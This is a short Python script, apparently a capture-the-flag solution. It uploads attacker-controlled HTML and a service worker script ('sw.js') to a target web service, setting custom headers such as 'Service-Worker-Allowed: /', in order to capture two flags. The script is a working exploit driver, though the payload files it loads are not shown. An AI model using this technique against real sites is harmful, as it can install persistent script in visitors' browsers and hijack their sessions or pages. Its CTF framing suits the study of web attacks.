import requests
import json
from pathlib import Path

host = input('host > ')

def register(name, header, body):
    res = requests.post(
        host,
        data={
            'name': name,
            'header': json.dumps(header),
            'body': body,
        }
    )
    print(res.status_code)
    assert '注册成功' in res.text, res.text
    
register('flag1', {
    'Content-Type': 'text/html',
}, Path('popper.html').read_text(encoding='utf-8'))

register('flag2_a', {
    'Content-Type': 'text/html',
}, Path('sw.html').read_text(encoding='utf-8'))

register('flag2_b', {
    'Content-Type': 'text/javascript',
    'Service-Worker-Allowed': '/',
}, Path('sw.js').read_text(encoding='utf-8'))

print('done')
# flag 1: visit http://.../flag1/
# flag 2: visit https://.../flag2_a/